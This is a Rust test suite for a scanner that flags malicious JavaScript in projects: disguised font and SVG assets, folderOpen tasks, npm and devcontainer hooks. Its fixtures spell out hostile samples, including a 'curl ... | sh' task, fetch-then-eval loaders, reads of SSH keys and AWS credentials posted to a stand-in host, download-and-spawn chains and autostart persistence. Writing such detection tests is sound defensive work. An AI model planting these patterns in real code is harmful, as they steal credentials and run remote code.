use serde_json::Value;
use std::{
    fs,
    path::PathBuf,
    process::Command,
    time::{SystemTime, UNIX_EPOCH},
};

#[test]
fn json_scan_completes_without_findings() {
    let root = temporary_directory("clean");
    fs::write(root.join("main.js"), b"export const answer = 42;\n").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format", "json"]);

    assert_eq!(output.status.code(), Some(0));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "complete");
    assert_eq!(report["network_access"], "disabled");
    assert_eq!(report["summary"]["files"], 1);
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn policy_finding_returns_one() {
    let root = temporary_directory("finding");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(
        root.join(".vscode/tasks.json"),
        br#"{"tasks":[{"label":"run","command":"curl https://example.invalid/x | sh","runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["risk"]["severity"], "critical");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_javascript_is_reported_and_bad_source_is_incomplete() {
    let root = temporary_directory("javascript");
    fs::write(
        root.join("fake.woff2"),
        b"module.exports = require('child_process');",
    )
    .unwrap();
    fs::write(root.join("broken.ts"), b"const = ;").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(2));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(report["status"], "incomplete");
    assert_eq!(report["files"][1]["parsed_language"], "javascript");
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "FILE-PARSEABLE-JAVASCRIPT" && finding["file"] == "fake.woff2"
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn build_config_import_elevates_fake_asset_with_process_execution() {
    let root = temporary_directory("reachable-asset");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./fake.svg'); module.exports = {};",
    )
    .unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert_eq!(finding["file"], "fake.svg");
    assert!(
        finding["evidence"]
            .to_string()
            .contains("tailwind.config.js")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_polinrider_woff2_trait_is_elevated_by_build_config() {
    let root = temporary_directory("woff-loader");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./fonts/icon.woff2');",
    )
    .unwrap();
    fs::create_dir(root.join("fonts")).unwrap();
    fs::write(
        root.join("fonts/icon.woff2"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
                && finding["severity"] == "critical"
                && finding["file"] == "fonts/icon.woff2")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_polinrider_chain_links_folder_open_woff2_and_remote_execution() {
    let root = temporary_directory("polinrider-chain");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(root.join(".vscode/tasks.json"), br#"{"tasks":[{"label":"warmup","command":"node boot.js","runOptions":{"runOn":"folderOpen"}}]}"#).unwrap();
    fs::write(root.join("boot.js"), b"require('./icon.woff2');").unwrap();
    fs::write(root.join("icon.woff2"), b"async function run() { const response = await fetch('https://example.invalid/control'); const source = Buffer.from(await response.text(), 'base64').toString(); Function(source)(); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE"
                && finding["severity"] == "critical")
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("folderOpen")
                && finding["evidence"].to_string().contains("decode"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_folder_open_trait_links_task_to_script() {
    let root = temporary_directory("folder-open-script");
    fs::create_dir(root.join(".vscode")).unwrap();
    fs::write(root.join(".vscode/tasks.json"), br#"{"tasks":[{"label":"boot","type":"shell","command":"node boot.js","runOptions":{"runOn":"folderOpen"}}]}"#).unwrap();
    fs::write(
        root.join("boot.js"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
                && finding["evidence"].to_string().contains("folderOpen"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn reconstructed_interview_start_trait_reaches_hidden_import() {
    let root = temporary_directory("start-hidden-import");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node index.js"}}"#,
    )
    .unwrap();
    fs::write(
        root.join("index.js"),
        b"require('./lib/config.js'); console.log('ready');",
    )
    .unwrap();
    fs::create_dir(root.join("lib")).unwrap();
    fs::write(root.join("lib/config.js"), b"async function boot() { const r = await fetch('https://example.invalid/control'); eval(await r.text()); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("npm start"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn npm_lifecycle_script_is_an_execution_root() {
    let root = temporary_directory("lifecycle-root");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"postinstall":"node setup.js"}}"#,
    )
    .unwrap();
    fs::write(
        root.join("setup.js"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
                && finding["evidence"].to_string().contains("npm postinstall"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn devcontainer_hook_reaches_local_script() {
    let root = temporary_directory("devcontainer-root");
    fs::create_dir(root.join(".devcontainer")).unwrap();
    fs::write(
        root.join(".devcontainer/devcontainer.json"),
        br#"{"postCreateCommand":"node setup.js"}"#,
    )
    .unwrap();
    fs::write(
        root.join("setup.js"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PROCESS-EXECUTION"
                && finding["evidence"]
                    .to_string()
                    .contains("postCreateCommand"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_minified_bundle_does_not_become_critical() {
    let root = temporary_directory("minified-benign");
    let source = format!(
        "const values=[{}]; console.log(values.length);",
        "1,".repeat(50_000)
    );
    fs::write(root.join("bundle.js"), source).unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["severity"] != "critical")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn representative_benign_js_patterns_have_no_critical_findings() {
    type Case<'a> = (&'a str, &'a [(&'a str, &'a [u8])]);
    let cases: &[Case<'_>] = &[
        ("vite", &[("vite.config.js", b"import { defineConfig } from 'vite'; export default defineConfig({ build: { outDir: 'dist' } });")]),
        ("webpack", &[("webpack.config.js", b"const cp = require('child_process'); const revision = cp.execSync('git rev-parse HEAD'); module.exports = { mode: 'production' };")]),
        ("electron", &[("main.js", b"const { clipboard } = require('electron'); console.log(clipboard.readText());")]),
        ("next", &[("next.config.js", b"fetch('/telemetry', { method: 'POST', body: process.env.NODE_ENV }); module.exports = {};")]),
        ("lifecycle", &[("package.json", br#"{"scripts":{"postinstall":"node setup.js"}}"#), ("setup.js", b"console.log('ready');")]),
    ];
    for (label, files) in cases {
        let root = temporary_directory(label);
        for (path, bytes) in *files {
            fs::write(root.join(path), bytes).unwrap();
        }
        let output = run(&[root.to_str().unwrap(), "--format=json"]);
        let report: Value = serde_json::from_slice(&output.stdout).unwrap();
        assert!(
            report["findings"]
                .as_array()
                .unwrap()
                .iter()
                .all(|finding| finding["severity"] != "critical"),
            "{label}"
        );
        fs::remove_dir_all(root).unwrap();
    }
}

#[test]
fn statically_dead_branch_does_not_create_a_remote_execution_chain() {
    let root = temporary_directory("dead-branch");
    fs::write(root.join("main.js"), b"if (false) { eval(await fetch('https://example.invalid/x')); } if (true) { console.log('ready'); }").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn dynamic_module_target_is_explicitly_unresolved() {
    let root = temporary_directory("dynamic-module");
    fs::write(
        root.join("main.js"),
        b"const name = process.argv[2]; require(name); import(name);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["unresolved_edges"]
            .as_array()
            .unwrap()
            .iter()
            .any(|edge| edge
                .as_str()
                .unwrap()
                .contains("dynamic module target unresolved"))
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-DYNAMIC-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn unimported_fake_asset_is_not_elevated() {
    let root = temporary_directory("unreachable-asset");
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); cp.exec('id');",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REACHABLE-DISGUISED-SOURCE" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn uncalled_function_in_imported_asset_is_not_critical() {
    let root = temporary_directory("uncalled-function");
    fs::write(root.join("tailwind.config.js"), b"require('./fake.svg');").unwrap();
    fs::write(
        root.join("fake.svg"),
        b"const cp = require('child_process'); function later() { cp.exec('id'); }",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_asset_with_only_nonsecret_environment_flag_stays_high() {
    let root = temporary_directory("asset-env-flag");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./feature.svg');",
    )
    .unwrap();
    fs::write(
        root.join("feature.svg"),
        b"const mode = process.env.NODE_ENV; console.log(mode);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn disguised_asset_with_computed_secret_access_is_critical() {
    let root = temporary_directory("asset-computed-secret");
    fs::write(
        root.join("tailwind.config.js"),
        b"require('./feature.svg');",
    )
    .unwrap();
    fs::write(
        root.join("feature.svg"),
        b"const token = process.env['TOKEN']; console.log(token);",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REACHABLE-DISGUISED-SOURCE")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn cross_file_response_decode_reaches_computed_function() {
    let root = temporary_directory("cross-file-flow");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node startup.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("api.js"), b"import axios from 'axios'; export async function config() { return (await axios.get('https://example.invalid/x')).data; }").unwrap();
    fs::write(
        root.join("utils.js"),
        b"export function unpack(x) { return Buffer.from(x, 'base64').toString(); }",
    )
    .unwrap();
    fs::write(root.join("startup.js"), b"import { config } from './api.js'; import { unpack } from './utils.js'; const data = unpack(await config()); global['Fun' + 'ction'](data)();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    let evidence = finding["evidence"].to_string();
    assert!(evidence.contains("npm start"));
    assert!(evidence.contains("axios.get"));
    assert!(evidence.contains("config"));
    assert!(evidence.contains("unpack"));
    assert!(evidence.contains("decode"));
    assert!(evidence.contains("Function"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn commonjs_wrapper_preserves_remote_data_across_files() {
    let root = temporary_directory("commonjs-wrapper");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node main.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("decode.js"), b"function unpack(x) { return Buffer.from(x, 'base64').toString(); } module.exports = { unpack };").unwrap();
    fs::write(root.join("main.js"), b"const helper = require('./decode.js'); async function boot() { const response = await fetch('https://example.invalid/x'); Function(helper.unpack(await response.text()))(); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("decode.js"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn static_eval_does_not_form_remote_execution_chain() {
    let root = temporary_directory("static-eval");
    fs::write(root.join("main.js"), b"eval('2 + 2'); fetch('/api/data');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| { finding["id"] != "JS-REMOTE-CODE-EXECUTION" })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn environment_secret_reaches_outbound_request() {
    let root = temporary_directory("secret-exfil");
    fs::write(
        root.join("main.js"),
        b"import axios from 'axios'; const secret = process.env.TOKEN; axios.post('https://example.invalid/collect', JSON.stringify({ token: secret }));",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert!(finding["evidence"].to_string().contains("process.env"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn home_relative_credential_file_reaches_outbound_request() {
    let root = temporary_directory("home-secret");
    fs::write(root.join("main.js"), b"const fs = require('fs'); const path = require('path'); const os = require('os'); const key = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa')); fetch('https://example.invalid/collect', { method: 'POST', body: key });").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn clipboard_data_reaches_outbound_request() {
    let root = temporary_directory("clipboard-exfil");
    fs::write(root.join("main.js"), b"const clipboardy = require('clipboardy'); const value = clipboardy.readSync(); fetch('https://example.invalid/collect', { method: 'POST', body: value });").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
                && finding["evidence"].to_string().contains("clipboardy"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn secret_sent_over_websocket_is_reported() {
    let root = temporary_directory("websocket-exfil");
    fs::write(root.join("main.js"), b"const socket = new WebSocket('wss://example.invalid/collect'); socket.send(process.env.TOKEN);").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION"
                && finding["evidence"].to_string().contains("WebSocket.send"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn websocket_message_callback_reaches_dynamic_execution() {
    let root = temporary_directory("websocket-control");
    fs::write(root.join("main.js"), b"const WebSocket = require('ws'); const socket = new WebSocket('wss://example.invalid/control'); socket.on('message', data => eval(data.toString()));").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION"
                && finding["evidence"].to_string().contains("ws"))
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_bytes_written_then_spawned_are_correlated() {
    let root = temporary_directory("write-spawn");
    fs::write(
        root.join("main.js"),
        b"const fs = require('fs'); const cp = require('child_process'); async function run() { const bytes = await fetch('https://example.invalid/x'); fs.writeFileSync('/tmp/payload', bytes); fs.chmodSync('/tmp/payload', 0o755); cp.spawn('/tmp/payload'); } run();",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| {
                finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE"
                    && finding["severity"] == "critical"
                    && finding["evidence"].to_string().contains("chmod")
            })
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn ordinary_file_written_then_spawned_is_not_a_download_chain() {
    let root = temporary_directory("ordinary-write-spawn");
    fs::write(root.join("main.js"), b"const fs = require('fs'); const cp = require('child_process'); fs.writeFileSync('/tmp/local-helper', '#!/bin/sh'); cp.spawn('/tmp/local-helper');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-DOWNLOAD-WRITE-EXECUTE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn promise_file_write_then_spawn_is_a_download_chain() {
    let root = temporary_directory("promises-write-spawn");
    fs::write(root.join("main.js"), b"import { writeFile } from 'node:fs/promises'; import { spawn } from 'node:child_process'; async function boot() { const response = await fetch('https://example.invalid/helper'); await writeFile('/tmp/remote-helper', await response.text()); spawn('/tmp/remote-helper'); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-DOWNLOAD-WRITE-EXECUTE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_response_in_shell_template_reaches_process_sink() {
    let root = temporary_directory("shell-template");
    fs::write(root.join("main.js"), b"const cp = require('child_process'); async function boot() { const response = await fetch('https://example.invalid/control'); cp.exec(`sh -c ${await response.text()}`); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn remote_data_in_bun_spawn_array_reaches_process_sink() {
    let root = temporary_directory("bun-spawn");
    fs::write(root.join("main.js"), b"async function boot() { const response = await fetch('https://example.invalid/control'); Bun.spawn(['sh', '-c', await response.text()]); } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-PROCESS-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn promise_callbacks_preserve_remote_response_to_execution() {
    let root = temporary_directory("promise-callback");
    fs::write(root.join("main.js"), b"fetch('https://example.invalid/control').then(response => response.text()).then(code => Function(code)());").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn loop_and_try_bodies_are_not_silently_dropped() {
    let root = temporary_directory("control-bodies");
    fs::write(root.join("main.js"), b"async function boot() { const response = await fetch('https://example.invalid/x'); try { for (let i = 0; i < 1; i++) { eval(await response.text()); } } catch (error) { console.log(error); } } boot();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-REMOTE-CODE-EXECUTION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn fetch_response_to_eval_and_secret_file_to_fetch_are_traced() {
    let root = temporary_directory("fetch-and-file");
    fs::write(root.join("main.js"), b"const fs = require('fs'); async function run() { const response = await fetch('https://example.invalid/config'); eval(await response.text()); const key = fs.readFileSync('/home/user/.ssh/id_rsa'); await fetch('https://example.invalid/collect', {method: 'POST', body: key}); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    assert_eq!(output.status.code(), Some(1));
    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let ids: Vec<&str> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|finding| finding["id"].as_str())
        .collect();
    assert!(ids.contains(&"JS-REMOTE-CODE-EXECUTION"));
    assert!(ids.contains(&"JS-SECRET-EXFILTRATION"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_network_and_environment_use_do_not_form_exfiltration() {
    let root = temporary_directory("benign-network");
    fs::write(root.join("main.js"), b"import axios from 'axios'; const mode = process.env.NODE_ENV; axios.post('/metrics', { count: 1 }); console.log(mode);").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn benign_environment_flag_sent_to_service_is_not_critical() {
    let root = temporary_directory("benign-env-flag");
    fs::write(
        root.join("main.js"),
        b"fetch('/metrics', { method: 'POST', body: process.env.NODE_ENV });",
    )
    .unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["severity"] != "critical")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn npm_start_reaches_whitespace_concealed_process_call() {
    let root = temporary_directory("concealed-start");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"npm run launch","launch":"node main.js"}}"#,
    )
    .unwrap();
    let source = format!(
        "const cp = require('child_process'); {}cp.exec('id');",
        " ".repeat(800)
    );
    fs::write(root.join("main.js"), source).unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-CONCEALED-EXECUTION")
        .unwrap();
    assert_eq!(finding["severity"], "high");
    assert!(finding["evidence"].to_string().contains("npm start"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn one_startup_route_correlates_exfiltration_and_remote_execution() {
    let root = temporary_directory("combined-chain");
    fs::write(
        root.join("package.json"),
        br#"{"scripts":{"start":"node main.js"}}"#,
    )
    .unwrap();
    fs::write(root.join("main.js"), b"import axios from 'axios'; axios.post('https://example.invalid/collect', process.env.TOKEN); async function run() { const response = await axios.get('https://example.invalid/control'); eval(response.data); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let finding = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .find(|finding| finding["id"] == "JS-COMBINED-ATTACK-CHAIN")
        .unwrap();
    assert_eq!(finding["severity"], "critical");
    assert!(
        finding["evidence"]
            .to_string()
            .contains("JS-SECRET-EXFILTRATION")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn untriggered_chains_do_not_claim_one_execution_route() {
    let root = temporary_directory("untriggered-correlation");
    fs::write(root.join("main.js"), b"fetch('https://example.invalid/collect', { method: 'POST', body: process.env.TOKEN }); async function run() { const response = await fetch('https://example.invalid/control'); eval(await response.text()); } run();").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .all(|finding| finding["id"] != "JS-COMBINED-ATTACK-CHAIN")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn startup_file_write_is_reported_but_ordinary_write_is_not() {
    let root = temporary_directory("persistence-write");
    fs::write(root.join("main.js"), b"const fs = require('fs'); const os = require('os'); fs.writeFileSync(os.homedir() + '/.config/autostart/helper.desktop', 'x'); fs.writeFileSync('notes.txt', 'x');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    let findings: Vec<_> = report["findings"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|finding| finding["id"] == "JS-PERSISTENCE-WRITE")
        .collect();
    assert_eq!(findings.len(), 1);
    assert!(findings[0]["evidence"].to_string().contains("autostart"));
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn fs_promises_secret_read_and_startup_write_are_traced() {
    let root = temporary_directory("fs-promises");
    fs::write(root.join("main.js"), b"import { readFile, writeFile } from 'node:fs/promises'; const key = await readFile('/home/user/.aws/credentials'); await fetch('https://example.invalid/collect', { method: 'POST', body: key }); await writeFile('/home/user/.config/autostart/agent.desktop', 'x');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-SECRET-EXFILTRATION")
    );
    assert!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "JS-PERSISTENCE-WRITE")
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn registry_startup_command_is_reported_but_quoted_words_are_not() {
    let root = temporary_directory("registry-command");
    fs::write(root.join("main.js"), b"const cp = require('child_process'); cp.exec('reg.exe add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Agent /d helper.exe'); cp.exec('echo reg add is just documentation');").unwrap();

    let output = run(&[root.to_str().unwrap(), "--format=json"]);

    let report: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(
        report["findings"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|finding| finding["id"] == "JS-PERSISTENCE-COMMAND")
            .count(),
        1
    );
    fs::remove_dir_all(root).unwrap();
}

#[test]
fn incomplete_and_invalid_invocations_use_distinct_exit_codes() {
    let missing = run(&["definitely-does-not-exist"]);
